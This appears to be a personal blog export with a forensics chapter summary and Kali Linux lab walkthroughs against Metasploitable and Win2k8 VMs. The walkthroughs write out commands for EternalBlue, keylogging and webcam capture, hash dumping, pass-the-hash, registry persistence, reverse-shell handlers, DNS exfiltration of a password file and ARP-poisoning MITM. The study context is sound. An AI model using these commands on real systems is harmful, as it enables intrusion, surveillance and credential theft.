
[{"content":"Welcome to Val\u0026rsquo;s official blog !\nDemonstrating security impact through documented penetration testing projects, vulnerability discoveries, and exploit development. This portfolio showcases applied offensive security skills with verifiable results and detailed methodologies.※(^o^)/※\n","date":"28 Dec, 2025","externalUrl":null,"permalink":"/","section":"","summary":"","title":"","type":"page"},{"content":"","date":"28 Dec, 2025","externalUrl":null,"permalink":"/categories/book/","section":"Categories","summary":"","title":"Book","type":"categories"},{"content":"","date":"28 Dec, 2025","externalUrl":null,"permalink":"/tags/career--training/","section":"Tags","summary":"","title":"Career \u0026 Training","type":"tags"},{"content":"","date":"28 Dec, 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"28 Dec, 2025","externalUrl":null,"permalink":"/tags/cybercrime/","section":"Tags","summary":"","title":"Cybercrime","type":"tags"},{"content":"","date":"28 Dec, 2025","externalUrl":null,"permalink":"/tags/data-acquisition/","section":"Tags","summary":"","title":"Data Acquisition","type":"tags"},{"content":"","date":"28 Dec, 2025","externalUrl":null,"permalink":"/tags/digital-evidence/","section":"Tags","summary":"","title":"Digital Evidence","type":"tags"},{"content":"","date":"28 Dec, 2025","externalUrl":null,"permalink":"/tags/digital-forensics/","section":"Tags","summary":"","title":"Digital Forensics","type":"tags"},{"content":"","date":"28 Dec, 2025","externalUrl":null,"permalink":"/tags/forensic-methodology/","section":"Tags","summary":"","title":"Forensic Methodology","type":"tags"},{"content":"","date":"28 Dec, 2025","externalUrl":null,"permalink":"/tags/forensic-tools/","section":"Tags","summary":"","title":"Forensic Tools","type":"tags"},{"content":"","date":"28 Dec, 2025","externalUrl":null,"permalink":"/tags/investigation-process/","section":"Tags","summary":"","title":"Investigation Process","type":"tags"},{"content":"\r1. What is Digital Forensics #\rIn the 21st century where everything in life is connected to an electronic device ranging from doorbells, smartphones, and social media. These all track your digital footprint and creates a profile that follows you around the internet. As a digital forensics investigator your job is to find all available criminal evidence, process it, and present findings to the finder of facts.\nIn other words digital forensics is a division of forensics involving the recovery and analysis of data that has been recovered from digital devices.\n2. Introduction to computer-based investigations #\rAs a digital forensics investigator you will find artifacts that may be incriminating or prove a subject\u0026rsquo;s innocence such as search history. It is your responsibility to critically analyze evidence of a specific user to prove or disprove allegations, which an effective examiner must be an unbiased third party with both technical knowledge of data and the legal understanding of evidence handling and testimony.\nThere are three main roles in the field which are as followed:\nThe first responder The investigator Crime scene technician 2.1 First Responder #\rThese are the ones called upon the crime happening, they will identify the following:\nPotential victims Witnesses Subjects Maintain control 2.2 Investigators #\rThe investigators will be called upon by the first responder where they both share information based on the crime scene\n2.3 Crime scene technician #\rThey have specialized training in the collection of evidence such as physical evidence or digital evidence. Responsible for preserving evidence and starting the chain of custody.\n3. Types of illicit images communication types #\rEmail-based communication Newsgroups / USENET Peer-to-Peer file sharing 4. Types of Crimes #\rCyber stalking / Cyberbullying Corporate espionage 5. The Response kit (Recommendation) #\ra response kit is unique to all digital forensic analysis which may include things such as: Digital camera - This is to record the scene as it is and also record all action performed when collecting digital evidence Latex gloves - Protection against biohazards and not leaving fingerprints Notepads - Take notes of who you talk to during the scene and some organisation\u0026rsquo;s policies require a hand-written sketch of the area where digital evidence has been collected Organizational paperwork - Official documents listing exactly what was taken, where it was taken from and any specific identifying marks or serial number. Paper storage bags/antistatic bags - This is to keep any evidence safe and away from electrical shock and prevent unauthorized access Storage media - Hard drives such as SSD and USB devices used to store an copy image of a server and collect the specific datasets Write Blocking devices - Hardware that allows you to access storage device without changing its content such as a forensic Bridge Kit Frequency shielding material - These are containers that block radio transmissions for devices such as mobile phones Toolkit - Tools such as screwheads to disassemble laptops, desktops, or mobile phones Miscellaneous items - Power cables, data cables, USB hubs, screws or anything that might be needed on site Forensic Laptop - Include forms, processes that need documenting, and any application you find useful to carry out your tasks Encryption - When traveling abroad it is common for security services or customs to seize devices so it\u0026rsquo;s a good idea to encrypt all evidence Software security keys - A decryption security key in the shape of a USB used to use the forensic software as some may become unavailable to use without it A program called VirtualHere which allows you to use USB security keys remotely as long as there is a network connection at your destination These should all be stored inside a Pelican-type case which should be crushproof and watertight along with a TSA-compliant locking device in case going abroad 6. Forensic Software #\rUsing pirated software is very unprofessional and puts the organisation at risks to viruses compared to license software which can be either open source or commercial software. Open-source software - Has no cost and can be edited, use for profit, educational and testing purposes The drawbacks are that there is little to no technical support if something goes wrong These often come as CLI and don\u0026rsquo;t provide GUI Commercial tool - Has better customer support, documentation and timely updates. Only downside is that you have to pay for these services Commercial tool may have more features compared to open-source tools which may require you to use one or more different open source tools to accomplish the same task Forensic software are not court approved which means you will need to understand how a tool has validated the results As a forensic investigator you have to know where the data came from and ensure the tool used provides an accurate representation of the data\nThis is known as the Daubert standard which determines whether a judge uses to decide if an expert\u0026rsquo;s opinion is trustworthy enough to be used in court. The factors the court considered are as follows:\nWhether the theory or technique can be or has been tested Whether it has been subjected to peer review and publication The known or potential error rate The existence and maintenance of standards Its acceptance within the scientific community 6.1 Open-source forensic tools #\rAutopsy: fully functioning suite of forensic tools which can be found here SIFT Workstation: SIFT is a VM which contains multiple forensic tools pre-installed which can be found here Paladin Forensic Suite: A live Linux Ubuntu OS with pre-installed open source forensic tools which can be found here CAINE (Computer Aided Investigative Environment): A GUI project which provides many open source forensic tools for free which can be found here 6.2 Commercial forensic tools (Windows) #\rX-Ways Forensics: https://www.x-ways.net/ EnCase: https://www.guidancesoftware.com/encase-forensic Forensic Toolkit (FTK): https://accessdata.com/products-services/forensic-toolkit-ftk Forensic Explorer (FEX): http://www.forensicexplorer.com/ Belkasoft Evidence Center: https://belkasoft.com/ec Axiom: https://www.magnetforensics.com/products/magnet-axiom/ 7. Forensic Investigator Training #\rTo become a digital forensics investigator you will need extensive training to achieve a level of competent which is ideal for court level investigations. Taking a 40-hour course doesn\u0026rsquo;t automatically make you a digital forensics investigator, this is taking the first step and continuing to train yourself and associate with other like-minded peers which will put you on track to becoming a professional.\n7.1 Forensic Investigative Training #\rInternational Association of Computer Investigative Specialists (IACIS): https://www.iacis.com/ EnCase Certified Examiner (EnCE): https://www.Opentext.com/products-and-solutions/services/training-and-learning-services/encase-training/certifications Accessdata Certified Examiner (ACE): https://accessdata.com/training/computer-forensics-certification Computer Hacking Forensic Investigator (CHFI): https://www.eccouncil.org/programs/computer-hacking-forensic-investigator-chfi/ Global Information Assurance Certification (GIAC): https://www.giac.org/certifications 7.2 Understanding case information and legal issues #\rThis is the information you get before you power up your workstation to begin investigating which you should ask the following questions:\n==What is the nature of the investigation?== Is it a narcotics case, homicide, or employee misconduct? ==What digital evidence do you expect to find at the scene?== Information received may not be accurate where you could be looking for a single laptop but find multiple laptop, desktops, and many mobile phones. ==what are the legal justification?== what is the rationale behind the search? Consent? A search warrant? You need to make sure you understand the limitation being placed on the search which can either be physical or digital limits. Finding relevant artefacts outside the limitation scope will mean you cannot use them as you may face sanctions ==Who are the subjects and suspects?== Depending on your role you may not have any contact with the subjects and suspects involve, but if you do try having a conversation with them to pry for information. ","date":"28 Dec, 2025","externalUrl":null,"permalink":"/posts/learn-computer-forensics-william-oettinger-1st-edition/chapter-1/","section":"Blog","summary":"","title":"Learn Computer Forensices Section 1: Acquiring Evidence","type":"posts"},{"content":"","date":"28 Dec, 2025","externalUrl":null,"permalink":"/series/learn-computer-forensics/","section":"Series","summary":"","title":"Learn-Computer-Forensics","type":"series"},{"content":"","date":"28 Dec, 2025","externalUrl":null,"permalink":"/tags/legal-compliance/","section":"Tags","summary":"","title":"Legal Compliance","type":"tags"},{"content":"","date":"28 Dec, 2025","externalUrl":null,"permalink":"/tags/response-kit/","section":"Tags","summary":"","title":"Response Kit","type":"tags"},{"content":"","date":"28 Dec, 2025","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"28 Dec, 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"27 Dec, 2025","externalUrl":null,"permalink":"/categories/forensics/","section":"Categories","summary":"","title":"Forensics","type":"categories"},{"content":"","date":"27 Dec, 2025","externalUrl":null,"permalink":"/tags/toc/","section":"Tags","summary":"","title":"TOC","type":"tags"},{"content":"\r1. Welcome Back #\rHello, and welcome back to my portfolio.\nI took a break from my work primarily due to my mental health and some personal matters. During this time, I was also adjusting to new medication that I take to help stabilize my mood. While essential, this medication brought some challenging side effects like drowsiness, fatigue, trouble sleeping, and restlessness that made it difficult to focus and maintain a creative routine.\nSimply managing these adjustments required a lot of my energy, which meant I couldn’t dedicate time to my projects the way I wanted to.\nNow that I’m feeling more balanced, I’m grateful to be back and excited to create again.\nThank you for your patience and understanding. 2 Introduction #\rFor this book, I’m diving into the world of digital forensics—the practice of uncovering, analyzing, and interpreting digital evidence to build clear, actionable reports for organizations.\nBelow, you’ll find the chapters covered in the book, along with my own summaries and takeaways from each section.\n3. Table of Contents #\rChapter 1: Acquiring Evidence Chapter 2: Basics Chapter 3: Advanced All Chapters\u0026hellip; ","date":"27 Dec, 2025","externalUrl":null,"permalink":"/posts/learn-computer-forensics-william-oettinger-1st-edition/","section":"Blog","summary":"","title":"William Oettinger - Learn Computer Forensics: Your one-stop guide to searching, analyzing, acquiring, and securing digital evidence, 2nd Edition","type":"posts"},{"content":"\r1. Introduction to book #\r2. Table of Contents #\rPart 1: Building a Penetration Testing Lab Part 2: Reconnaissance and Footprinting Part 3: Exploring Active Reconnaissance Techniques Part 4: Performing Vulnerability Assessments Part 5: Understanding Reverse and Binding Shells Part 6: All On Networking Penetration, Baby! Part 7: Advanced Network Penetration Testing \u0026amp; Post-Exploitation ","date":"27 Dec, 2024","externalUrl":null,"permalink":"/posts/ultimate-kali-linux-book/","section":"Blog","summary":"","title":"Glen D. Singh - The Ultimate Kali Linux Book: Perform advanced penetration testing using Nmap, Metasploit, Aircrack-ng, and Empire, 2nd Edition","type":"posts"},{"content":"","date":"27 Dec, 2024","externalUrl":null,"permalink":"/tags/hacking/","section":"Tags","summary":"","title":"Hacking","type":"tags"},{"content":"","date":"27 Dec, 2024","externalUrl":null,"permalink":"/tags/hardware/","section":"Tags","summary":"","title":"Hardware","type":"tags"},{"content":"","date":"27 Dec, 2024","externalUrl":null,"permalink":"/tags/series/","section":"Tags","summary":"","title":"Series","type":"tags"},{"content":"","date":"27 Dec, 2024","externalUrl":null,"permalink":"/series/ultimate-kali-linux-book/","section":"Series","summary":"","title":"Ultimate-Kali-Linux-Book","type":"series"},{"content":"","date":"19 Jul, 2024","externalUrl":null,"permalink":"/tags/kali/","section":"Tags","summary":"","title":"Kali","type":"tags"},{"content":"\r1. Post-exploitation using Meterpreter #\rUsing the reverse-shell gained from Part 6 #42 smb eternalblue vulnerability Meterpreter runs on the targets memory which doesn\u0026rsquo;t write any data, however it will show as a running process. We can migrate the process into a less suspicious process with run post/windows/manage/migrate Windows will have hashes of users login password stored on the Security Account Manager (SAM) which is usually located at C:\\Windows\\System32\\config. This can be retrieved using hashdump 1.1 Useful Meterpreter Commands #\rkeyscan_start: Meterpreter begins capturing the keystrokes entered by a user on the compromised host. keyscan_stop: Stop capturing the keystrokes entered by a user on the compromised system. keyscan_dump: Exports the captured keystrokes into a file. screenshot: Meterpreter will capture a screenshot of the desktop on the compromised host. screenshare: Begins a real-time stream showing the live actions performed by a user on the compromised host. record_mic: Meterpreter activates the microphone on the compromised host and begins recording. webcam_list: Displays a list of webcams available on the compromised host. webcam_snap: Activates the webcam on the compromised host and takes a picture. webcam_stream: Begins a live stream from the webcam on the compromised system. search: Using the search –f \u0026lt;filename\u0026gt; command quickly searches on the compromised system for the file. pwd: Displays the present working directory when using a Meterpreter shell on a compromised system. cd: This command allows you to change the working directory while using the Meterpreter session on a compromised host.\n1.2 Uploading and downloading files #\rUploading vncviewer.exe from Part 5 with meterpreter \u0026gt; upload /usr/share/windows-binaries/vncviewer.exe c:\\\\ Download files with download c:\\\\java0.log /home/kali/Desktop 2. Privilege Escalation In Meterpreter #\rWhen targeting real organisations I will be most likely targeting employees that aren\u0026rsquo;t the most tech-savy to gain either a reverse or bind shell, this is great to get access inside a network but I won\u0026rsquo;t have the level of access to perform administrative commands which is game over for a target.\nTo increase my privilege on the win2k8 vm machine I will use the priv extension provided within Meterpreter 2.1 Token Stealing and Impersonation #\rWhen an admin remotely accesses a host this creates a token like a footprint of their past login activity, if found on a compromised host within a Meterpreter shell it can be used to escalate our privilege\nWith a MSF eternalblue meterpreter shell, run use incognito to get extra commands followed by list_tokens -u I then logged into the win2k8 lab administrator account and impersonated the token with impersonate_token \u0026quot;VAGRANT-2008R2\\Administrator\u0026quot;\nUse getsystem command to migrate from administrator to system authority which is the highest level of authority. 3. Implementing Persistence #\rA meterpreter shell connection will be loading into ram meaning that whenever the target client turn\u0026rsquo;s off power to their machine we loose a connection which means we will have to go through the process of opening another shell. I could use a few techniques with Meterpreter to create persistence, meaning that I could connect to the host whenever it\u0026rsquo;s online.\n3.1 Creating Persistence through Account Creation Backdoor #\rWith a Meterpreter connection to the Win2k8 Lab machine, execute following command to enable RDP port: run post/windows/manage/enable_rdp Create a shell and run net user pentester password1 /add to create a user \u0026lsquo;pentester\u0026rsquo; with \u0026lsquo;password1\u0026rsquo; as the login pass When trying to connect using the Rdesktop tool to log into the account created I come across an error message for configuring allow log on for the user !! Try to find a bypass for RDP new member Allow log on through Terminal Services, check if the payload has been created ! If persistence isn\u0026rsquo;t necessary for a penetration test, simply don\u0026rsquo;t do it.\r3.2 Registry Persistence Creation #\rMSF contains two main modules which are designed for Window persistence creation:\nexploit/windows/local/persistence exploit/windows/local/registry_persistence Both will modify the registry value located within HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and insert a VBS script in C:\\WINDOWS\\TEMP\\ which executes the script whenever the user boots up the machine. Execute the following commands on MSF meterpreter \u0026gt; background msf6 \u0026gt; use exploit/windows/local/persistence msf6 (windows/local/persistence) \u0026gt; set SESSION 1 msf6 (windows/local/persistence) \u0026gt; set STARTUP SYSTEM msf6 (windows/local/persistence) \u0026gt; set LHOST 172.30.1.21 msf6 (windows/local/persistence) \u0026gt; set LPORT 87 msf6 (windows/local/persistence) \u0026gt; exploit After creating a persistence payload on the target, connect to it with the following commands msf6 \u0026gt; use exploit/multi/handler msf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; set AutoRunScript post/windows/manage/migrate msf6 exploit(multi/handler) \u0026gt; set LPORT 87 msf6 exploit(multi/handler) \u0026gt; exploit 3.3 Lateral Movement and Pivoting #\rTurn on Metsploitable 3 Win2k8 and Metasploitable 3 Linux Obtain a Meterpreter shell and use the arp command List network interfaces and their MAC address with ipconfig which allows us to see the hidden network Netmask in the following screenshot: The route command will confirm any gateways accessible from the Meterpreter connection Give access to these hidden routes with run post/multi/manage/autoroute which will allow connection to these other networks 3.4 Clearing Tracks after Penetration Test #\rMake sure to remove any custom payloads, configuration changes, backdoor after a penetration test on an organisation\r4. Data Encoding and Exfiltration #\rƸӜƷ ƸӜƷ ƸӜƷ Hey I know I\u0026rsquo;ve been talking a lot but I appreaciate you being here reading on, you never know when I\u0026rsquo;ll drop secretes of the story here in the research huh? Well I will be so be on the lookout ƸӜƷ ƸӜƷ ƸӜƷ\nIn this section I will be going over encoding payloads to reduce detection rate and also how to extract sensitive files without being detected. I will learn more on encoding Windows executable and how to convert files into DNS queries.\n4.1 Encoding Executable with exe2hex #\rExe2hex is a encoder which comes with Kali that allows for conversions from window executable to ASCII which when ran on a victim will convert back into an executable, this method of encoding isn\u0026rsquo;t an effective way to stay stealthy.\nUse /usr/bin/exe2hex -x vncviewer.exe to convert the vncviewer.exe encoded file from [[Chapter-7-Understanding-Network-Penetration-Testing#2.2 Using Shellter to reduce detection]] Setup a Metasploit listener with the following commands: sudo msfconsole msf6 \u0026gt; use exploit/multi/handler msf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; set AutoRunScript post/windows/manage/migrate msf6 exploit(multi/handler) \u0026gt; set LHOST 172.30.1.22 msf6 exploit(multi/handler) \u0026gt; exploit Open a python web server with python3 -m http.server 8080 and navigate to the address using the targets client and download the vncviewer.cmd file from the exe2hex encoding Run the vncviewer.cmd file, this will reassemble the ASCII file into an executable which can be ran to open a meterpreter shell between Kali and the target After running the executable a meterpreter session has opened 5. Data Exfiltration using PacketWhisper #\r5.1 Setting up the environment #\rInstall the following packages from git: git clone https://github.com/TryCatchHCF/PacketWhisper wget https://github.com/TryCatchHCF/PacketWhisper/archive/refs/heads/master.zip Install the master.zip file using a Python web server with the command python3 -m http.server 8080 Install python-2.7.18 onto the win2k8 lab machine after transferring, this will allow us to run the PacketWhisper scripts on the machine Go to Control Panel \u0026gt; System and Security \u0026gt; System \u0026gt; Advanced system settings \u0026gt; Environment Variables Under the System variables section select Path and click on Edit where ,C:/Pyton27 should be added at the end of the Variable value string. This will allow python programs to run on this dinosaur system 5.2 Changing the DNS setting on the compromised host #\rA tool which will allow stealthy file transfer over DNS from a compromised machine to another on a network\nOn the win2k8 machine head to Control Panel \u0026gt; Network and Sharing Center \u0026gt; Change Adapter Settings Then double-click on the PentesNet adaptor and select Internet Protocol Version 4 5.3 Performing Data Exfiltration #\rExtract the master.zip file containing PacketWhisper and cd into it from the compromised machine, create a password file containing credentials Run the program with python packetWhisper.py and select option 1 to transfer a file via DNS: Make the following selections below to choose a cipher and a cloak: Agree to view the samples with y and begin transfer while having Wireshark opened on Kali listening to traffic coming from the PentesNet 172.30.1.0/24 Wireshark will start to collect traffic coming from the compromised system which should be saved into PacketWhisper directory and saved as a pcap for reading Now that we sneakly sent over a password file over DNS we can read the file over on Kali by running python2 packetWhisper.py and making the following selections: The file can be read with cat decloaked.file 6. Understanding MITM and packet sniffing attacks #\rA network will connect devices through switches which constantly send packages containing different types of information, these can contain credentials, documents website visited depending on the protocol used.\nAn MITM or also known as a Man-in-the-middle attack which sits between packet traffic flow on a network.\n6.1 Using Ettercap to perform a MITM attack #\rMITM can make use of the Address Resolution Protocol (ARP) which resolves a IP to MAC address to map all devices on a network, this is stored within a ARP cache on each host device. I will be using Ettercap to poison the ARP cache to redirect all traffic from both my win2k8 and OWASP BWS lab to my Kali linux machine\nMake sure both win2k8 and OWASP BWS virtual machines are on the PentesNet network and execute the following command on Kali: sudo ettercap -i eth1 -T -q -S -M arp:remote /172.30.1.21// /172.30.1.23// On the win2k8 VM go to http://\u0026lt;OWASP-BWA-IP\u0026gt; through a browser which I could then read packages through Wireshark, here we can see HTTP connections being established by both VMs Confirm that the ARP has been poisoned by Ettercap with arp -a on the win2k8 VM We can send credentials through an unsecure HTTP connection between each VMs by selecting OWASP WebGoat which will prompt the user to enter login credentials. This will be picked up by Ettercap Conclusion #\rAlright guys hope yall enjoyed this months chapter, I do try to get these out as fast as humanly as possible so let me try, as of today (23/07/2024) I have written so much late at night that it\u0026rsquo;s unbelievable that I was the same person a couple of years ago. This is something I can be excited about when I wake up and put all my energy into which is a great way to forget about other troubles. I would like to get back into routine more and meditate to keep my sanity sane. Thank you for reading.\n","date":"19 Jul, 2024","externalUrl":null,"permalink":"/posts/ultimate-kali-linux-book/part-7-advanced-network-penetration-testing-post-exploitation/","section":"Blog","summary":"","title":"Kali Linux Part 7: Advanced Network Penetration Testing Post Exploitation","type":"posts"},{"content":"","date":"19 Jul, 2024","externalUrl":null,"permalink":"/tags/networking/","section":"Tags","summary":"","title":"Networking","type":"tags"},{"content":"","date":"19 Jul, 2024","externalUrl":null,"permalink":"/categories/walkthrough/","section":"Categories","summary":"","title":"Walkthrough","type":"categories"},{"content":"","date":"19 Jul, 2024","externalUrl":null,"permalink":"/tags/windows-exploit/","section":"Tags","summary":"","title":"Windows-Exploit","type":"tags"},{"content":"Another sunny day here down the sea front, slight morning breeze, have a runny nose and sunsets are starting to look purple which are quite the site. A perfect season to do my CTF training in the morning when the sparrows start to chirp; relax in the afternoon for a bike ride, this will be my routine for the end of my first year of Uni ! Summer here we come.⛅\nLots of exciting stuff has happened but I\u0026rsquo;ll keep it short:\nHad a fantastic idea last night for a project which will last a lifetime, a project that will be updated and released on a three-year cycle. It\u0026rsquo;s very ambitious which some may say, impossible, with balancing University, Gym, Bouldering, Best friends, watch/read anime, read and more ! This is just asking for a burnout at this point lol how does he do it ? Time management, and seeing how spinning multiple plates is like by seeing how many I can hold one at the time, what happens when I spin one faster than the others? what happens to the balance of it all? How I deal with all plates falling off etc. Truly a worthwhile skill to have which I have been working on for over 2 years now and will reveal more over the future. Have a whole bunch of trips, events and holidays coming up! Lazer tag for end of Uni this Thursday, camping on the 26th, Belgium and more !\nThe house sparrows have grown in numbers this year, it truly brings us a rich garden, I think it may be from the papa and mama bringing children here, it\u0026rsquo;s great for the plants and they\u0026rsquo;re experimenting with how other trees feel around because there\u0026rsquo;s so many! Love to watch them sit to share stuff they\u0026rsquo;ve learned, forming communities which help each other against the jaguars(cat) that lurks in the bushes ready to pounce if one left alone, fall in love and form families all outside my bedroom window.\nAnyway, enough of a life update and lets talk Networking Penetration baby. This is one of the most important discipline to learn when testing the security of an organisation, understanding how to navigate around a network could expose vulnerable devices which could be leveraged for higher privileges or probed for credentials.\n1. Discovering live systems #\rWhen pentesting an organisation they may give you internal access to the network along with an agreement of what scope of the system should be targeted, make sure this agreement isn\u0026rsquo;t breached as this can break legal agreements.\nI will be using metasploitable 2 and metasploitable 3 created in the labs section [4. Setting up Metasploitable 2]\n1.1 Scanning for available devices using Netdiscover #\rUsing netdiscover, I will scan for available devices within a range, make sure vm or attacking machine isn\u0026rsquo;t connected to the internet or other networks as the scan can pick up on other devices. This is a stealthy way of scanning for devices as it listens for ARP messages sent by hosts.\n$ sudo netdiscover -pf # Random, passive fast scan $ sudo netdiscover -r 172.30.1.0/24 -i eth1 # Range scan and NIC Sometimes ICMP probing can be disabled on some network to avoid hacker from discovering systems on a network\r1.2 Scanning for available devices using Nmap #\r$ nmap -sn 172.30.1.0/24 1.3 Scanning for available devices using nbtscan #\rUsing nbtscan to scan for any file sharing systems running on the network with sudo nbtscan -r 172.30.1.0/24 2. Profiling a target system #\rIt is important to perform as much recon on a target such as scanning for ports, OS version, running services as most systems run software on an older version as updating to a newer version will mean down-time due to having to reconfigure or it not being compatible with other software within the infrastructure. Sometimes the system just works so there is no need to update to a newer version ¯_(ツ)_/¯\n2.1 Using Nmap to scan for OS versions #\r$ nmap -A 172.30.1.21 3. Exploring password-based attacks #\rThere are a wide range of techniques to crack accounts, login portals and password-protected files or devices:\nBrute force - Using combination list of possible passwords Password spraying - Using the same password on multiple accounts Dictionary attack - Using a list of common words and phrases Password guessing Password cracking - Uses tools and techniques to retrieve login credentials Credential stuffing - Use password from a breached database Username:Password on multiple platform for credential overlap. Online password attacks - Web based or protocol cracking Offline password attacks - Password-protected devices, zip files, encrypted drives etc. 3.1 Using Ncrack to guest passwords online #\rFor this I will be using the Win2k8 vagrant machine as a victim and will be attacking the rdp protocol hosted on port 3389, here is a nmap scan with script probing: ┌──(kali㉿kali)-[~] └─$ ncrack -vv -T 3 -u Administrator -P /usr/share/wordlists/rockyou.txt rdp://172.30.1.21 Starting Ncrack 0.7 ( http://ncrack.org ) at 2024-06-13 06:46 BST Discovered credentials on rdp://172.30.1.21:3389 \u0026#39;Administrator\u0026#39; \u0026#39;vagrant\u0026#39; 3.2 Using Hydra to guest passwords online #\rHydra is another popular online cracking tool which has multiple uses to target web pages and protocols, a great tool to have. Same target as 3.1:\nsudo hydra -t 4 -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://172.30.1.21 Results: 3.3 Exploiting Remote Desktop Protocol (RDP) #\rWith the password cracked from 3.1 and 3.2 I can use the rdesktop tool to remotely access which should give me full view and control of the user which is Administrator:vagrant\nrdesktop -u Administrator -p vagrant 172.30.1.21:3389 -g 1280x1024 3.4 Creating custom wordlists/dictionary using CeWl #\rWhen using a brute force dictionary attack like in 3.1 and 3.2 if the password isn\u0026rsquo;t contained within the wordlist then there will be no access.\nThere are many tools to generate custom wordlists with specific regex, CeWL is unique as it takes a website as an input for generating a wordlist by using common words used on the website.\ncewl example.com -m 6 -w output_dictionary_file.txt website: Results:\nExample Domain domain illustrative examples documents literature without coordination asking permission information 3.5 Creating custom wordlists/dictionary using Crunch #\rSeems to throw a setlocale() failed error may require fix on main pc\rCrunch allows for custom wordlist generation which can be done by providing a min and max character count along with some key words and rules to generate every possible combination using what has been provided\ncrunch 4 4 0123456789ABC -o output_file.txt 4. Identifying and Exploiting Vulnerable services #\rIn this section I will be exploiting plain login access for File Transfer Protocol (FTP) and Server Messaging Block (SMB)\n4.1 Anonymous Login Misconfiguration on FTP #\rFile Transfer Protocol commonly on port 21 is used to allow external access from other machines to a storage server as a way to download files remotely.\nUpon scanning the Win2k8 machine I can see that a misconfiguration to the server has been made which allows for anonymous FTP login. Tut-tut, an easy prey, very naughty.\nNmap script probing scan on Win2k8 lab machine we can see that login in with the user Anonymous: will grant access but something more interest appeared: Looking up \u0026ldquo;vsFTPd 2.3.4 vulnerability\u0026rdquo; on the internet shows a metasploitable module which can give me a backdoor to the prey. Load msf and module unix/ftp/vsftpd_234_backdoor\nAfter gaining a reverse shell I spawned a python-based pseudo terminal in the bind shell with python -c import pty:pty.spawn(\u0026quot;/bin/bash\u0026quot;)` Listed passwords stored in /etc/shadows which I then saved in a txt file to be cracked using John the Ripper 4.2 SMB Eternalblue vulnerability #\rmore on SMB open at HackTricks: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb\rSMB is a protocol used to send files over one connected device such as nodes, printers and serial ports on a network. Commonly hosted on port 445, 135-139, SMB is commonly used on Windows machines.\nFirst Nmap scan common SMB port range between 135-139: See that the Win2k8 machine is using Windows Server 2008 and load up the MSF windows/smb/ms17_010_eternalblue module: After getting a shell, retrieved login accounts and password hash credentials with the hashdump command in meterpreter and checked hash ID: 4.3 Cracking Passwords with Hashcat #\rFrom the hash retrieved we can use hashcat to compare the hash of a common wordlist against the hashes we have, if it\u0026rsquo;s a hit I will have access to the network such as admin login creds ᶘ ᵒᴥᵒᶅ\n$ hashcat -m 1000 /home/val/Desktop/hashdump.txt -a 0 /home/val/Downloads/rockyou_1.txt 4.4 Getting a shell with PsExec #\rMicrosoft have developed a suite of tools known as sysinternals which provides a set of tools for administrators, they can be found and downloaded from: https://learn.microsoft.com/en-us/sysinternals/downloads\nOne of these tools under the process utilities category is the PsExec which is a remote control program which allows sysadmins to execute programs.\nLoading MSF and module windows/smb/psexec to exploit Gain reverse shell of network with command shell 4.5 Accessing remote shares using SMBclient #\rSMBclient is a tool which allows user talk to a SMB server such as accessing files stored, uploading files from a local machine and retrieving directory information. This is part of the Samba suite.\n# Access smb server using admin as user input smbclient -L \\\\\\\\172.30.1.23\\\\ -U Administrator When listing file shares on windows system \\\\\\\\ is required before the IP and \\\\ after the IP\nThis will display all the available root directories available for navigation, a folder can then be explored using: smbclient \\\\\\\\172.30.1.21\\\\ADMIN$ -U Administrator\nDiscovering Admin folder:\nDiscovering C$ folder: Download image file jack_of_diamonds.png with the get command. Due to misconfigurations I am able to download sensitive images and logs which could be used to further target an organisation or innocents.\n5 Passing the Hash Technique #\rBrute-force and dictionary password attacks take long time to perform which isn\u0026rsquo;t ideal for pentesters where they will have time constraints.\nThis is where the passing the hash techniques is used as it will capture the NTLM password hash stored by windows system and pass it to the active directory (AD) and Domain Controller (DC) using specific tools to execute code remotely without having to crack password.\n5.1 Getting that shell with PTH-WinExe #\rUsing the Hash gathered from the hashdump earlier, using pass-the-hash for windows module from the Pass-The-Hash toolkit to transfer the hash over the network.\npth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b //172.30.1.21 cmd 5.2 Impacket, the tool to rule them all #\rImpacket is a suite of networking tools, written in Python, designed for pentesting networks, here are the available tools:\nI will be performing a PTH attack with the impacket-psexec Python module on the Win2k8 machine\nimpacket-psexec Administrator@172.30.1.21 -hashes aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b 6. Gaining Access by Exploiting SSH #\rSSH is a network protocol which allows administrators to log into a machine and perform remote code execution.\nNmap scan for common SSH port 22: Load MSF and the module scanner/ssh/ssh_enumusers to get a list of possible users: Then use the scanner/ssh/ssh_login MSF module to attempt an SSH login with the credentials Administrator:vagrant. We got these from previous sections from hash cracking, use the sessions command to move shell to background\nChecked sessions ID with sessions and used sessions -i \u0026lt;session-ID\u0026gt; 7. Exploiting Windows Remote Management WinRM #\rMore details at https://learn.microsoft.com/en-us/windows/win32/winrm/portal\rWinRM is a protocol which allows administrators to remotely manage computers on a network. Commonly found on port HTTP-5985 and HTTPS-5986.\n7.1 WinRM enumerating with MSF #\rNmap script scan on port 5985: $ nmap -A -p 5985 172.30.1.21 Load MSF and the module auxiliary/scanner/winrm/winrm_cmd Fill out options for MSF WinRM module and execute the exploit Result:\nWindows IP Configuration Host Name . . . . . . . . . . . . : vagrant-2008R2 Primary Dns Suffix . . . . . . . : Node Type . . . . . . . . . . . . : Hybrid IP Routing Enabled. . . . . . . . : No WINS Proxy Enabled. . . . . . . . : No Ethernet adapter Local Area Connection 2: Connection-specific DNS Suffix . : Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Desktop Adapter #2 Physical Address. . . . . . . . . : 08-00-27-66-C5-26 DHCP Enabled. . . . . . . . . . . : Yes Autoconfiguration Enabled . . . . : Yes Link-local IPv6 Address . . . . . : fe80::1152:69be:3691:de8%14(Preferred) IPv4 Address. . . . . . . . . . . : 10.11.12.22(Preferred) Subnet Mask . . . . . . . . . . . : 255.255.255.0 Lease Obtained. . . . . . . . . . : Saturday, May 04, 2024 10:15:24 PM Lease Expires . 